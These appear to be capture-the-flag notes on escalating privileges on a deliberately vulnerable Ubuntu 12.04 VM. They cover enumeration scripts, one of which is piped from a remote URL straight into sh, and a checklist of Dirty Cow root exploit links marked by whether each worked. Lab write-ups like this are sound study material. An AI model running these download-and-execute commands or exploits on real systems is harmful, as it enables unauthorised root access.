# Some notes

## Identification

```shell
cat /etc/*-release
  DISTRIB_ID=Ubuntu
  DISTRIB_RELEASE=12.04
  DISTRIB_CODENAME=precise
  DISTRIB_DESCRIPTION="Ubuntu 12.04.5 LTS"
  NAME="Ubuntu"
  VERSION="12.04.5 LTS, Precise Pangolin"
  ID=ubuntu
  ID_LIKE=debian
  PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"
  VERSION_ID="12.04"

uname -a
  Linux BornToSecHackMe 3.2.0-91-generic-pae \#129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

---

## LinEnum.sh

LinEnum — is a bash-script that can do all the nasty job for you making all the adjustments described here cheat sheet’e. By and large, it has about 65 different checking operations, ranging from getting an information about the kernel version to searching potentially interesting SUID/GUID files. Besides, you can send a lock world to script that it would search in the all configurations and log-files. You can launch the checking like this: ./LinEnum.sh -k keyword -r report -e /tmp/ -t. After the scanning is complete you will get a detail report where the most interesting points will be highlighted with the yellow colour.

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh > /tmp/LinEnum.sh
chmod +x /tmp/LinEnum.sh

/tmp/LinEnum.sh -k keyword -r report -e /tmp/
```

[Report here](logs/LinEnum-export-10-12-20.html)

---

## linPEAS.sh

LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\* hosts. The checks are explained on book.hacktricks.xyz

Check the Local Linux Privilege Escalation checklist from [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)

[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

```shell
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh > linPEAS.log
```

[Report here](logs/linPEAS.html)

---

## LES: Linux privilege escalation auditing tool

LES tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It provides following functionality:

- Assessing kernel exposure on publicly known exploits
- Verifying state of kernel hardening security measures

[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

```shell
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
bash les.sh > les.log
```

[Report here](logs/les.html)

---

## Linux Exploit Suggester 2

This script is extremely useful for quickly finding privilege escalation vulnerabilities both in on-site and exam environments.

[https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

```shell
curl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl > linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl
```

## [Report here](logs/linux-exploit-suggester-2.html)

## Dirty Cow - PoCs

[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

### List of PoCs

- https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c ❌
  - Allows user to write on files meant to be read only.
- https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679 ❌
  - Gives the user root by overwriting /usr/bin/passwd or a suid binary.
- https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2 ❌
  - Gives the user root by patching libc's getuid call and invoking su.
- https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c ✅
  - Allows user to write on files meant to be read only.
- https://github.com/xlucas/dirtycow.cr
  - Allows a user to write on files meant to be read only.
- https://github.com/timwr/CVE-2016-5195
  - Allows user to write on files meant to be read only (android).
- https://github.com/rapid7/metasploit-framework/pull/7476
  - Metasploit module based on the cowroot PoC.
- https://github.com/scumjr/dirtycow-vdso
  - Gives the user root by patching the vDSO escapes containers/SELinux doesn't need suid.
- https://gist.github.com/mak/c36136ccdbebf5ecfefd80c0f2ed6747 ❌
  - Gives the user root by injecting shellcode into a SUID file.
- https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54 ✅
  - Gives the user root by injecting shellcode into a SUID file using PTRACE_POKEDATA .
- https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2
  - Gives the user root by replacing /etc/passwd
- https://gist.github.com/chriscz/f1aca56cf15cfb7793db0141c15718cd
  - Allows user to write on files meant to be read only. Supports writing to multiple pages, not just the first
- https://github.com/nowsecure/dirtycow
  - Allows the user to write on files meant to be read only, implemented as a radare2 IO plugin.
- https://github.com/sivizius/dirtycow.fasm
  - Gives the user root by injecting shellcode into a SUID file. implemented for amd64 in flatassembly.
- https://github.com/gbonacini/CVE-2016-5195
  -Gives the user root by replacing /etc/passwd
- https://github.com/mengzhuo/dirty-cow-golang/blob/master/dirtyc0w.go
  - Allows user to write on files meant to be read only. implemented for arm32/x86/amd64 in Golang faster than c implement.
- https://github.com/FireFart/dirtycow/blob/master/dirty.c
  - Generates a new password hash on the fly and modifies /etc/passwd automatically. Just run and pwn.
